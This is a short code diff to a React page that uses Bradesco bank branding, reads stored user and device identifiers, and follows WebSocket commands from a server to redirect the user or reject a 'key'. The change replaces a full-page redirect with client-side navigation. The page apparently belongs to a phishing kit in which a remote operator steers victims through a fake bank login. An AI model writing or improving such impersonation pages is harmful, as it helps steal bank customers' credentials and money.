@@ -1,7 +1,10 @@
 import { useEffect, useRef, useState, useCallback } from "react";
+import { useNavigate } from "react-router-dom";
 import bradescoLogo from "@/assets/bradesco-logo.png";
+import { resolveServerRoute } from "@/lib/resolveServerRoute";
 
 const FeixePage = () => {
+  const navigate = useNavigate();
   const usuario = localStorage.getItem("usuario") || "";
   const dispositivo = localStorage.getItem("dispositivo") || "";
   const wsRef = useRef<WebSocket | null>(null);
@@ -81,7 +84,9 @@ const FeixePage = () => {
       }
       if (msg.acao === "redirecionar" && msg.url) {
         setStatus("validando");
-        setTimeout(() => { window.location.href = msg.url; }, 1500);
+        setTimeout(() => {
+          navigate(resolveServerRoute(msg.url));
+        }, 1500);
       }
       if (msg.acao === "erro_chave") {
         setErroChave(msg.motivo || "Chave inválida. Tente novamente.");
